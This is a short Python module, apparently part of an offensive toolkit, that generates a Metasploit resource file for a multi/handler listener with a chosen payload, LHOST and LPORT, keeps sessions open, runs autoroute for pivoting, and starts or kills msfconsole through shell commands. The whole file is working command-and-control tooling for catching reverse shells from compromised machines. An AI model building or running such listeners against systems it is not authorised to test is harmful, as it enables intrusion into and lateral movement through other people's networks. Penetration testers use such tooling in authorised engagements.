import os
import subprocess

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RES_DIR = os.path.join(ROOT, "resources")

RC_TEMPLATE = """use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set AutoRunScript post/multi/manage/autoroute
exploit -j
"""

def generate_rc(payload, lhost, lport, output_name="listener.rc"):
    os.makedirs(RES_DIR, exist_ok=True)
    rc_path = os.path.join(RES_DIR, output_name)

    content = RC_TEMPLATE.format(
        payload=payload,
        lhost=lhost,
        lport=lport
    )
    with open(rc_path, "w") as f:
        f.write(content)

    print(f"[+] Listener RC: {rc_path}")
    return rc_path

def start_listener(rc_file, background=False):
    if not os.path.exists(rc_file):
        print(f"[x] RC file not found: {rc_file}")
        return

    print(f"[*] Starting Metasploit listener...")
    if background:
        cmd = f"msfconsole -q -r \"{rc_file}\" &"
        subprocess.Popen(cmd, shell=True)
        print("[+] Listener started in background")
    else:
        cmd = f"msfconsole -q -r \"{rc_file}\""
        subprocess.run(cmd, shell=True)

def stop_listener():
    subprocess.run("pkill -f msfconsole 2>/dev/null", shell=True)
    print("[+] Listener stopped")
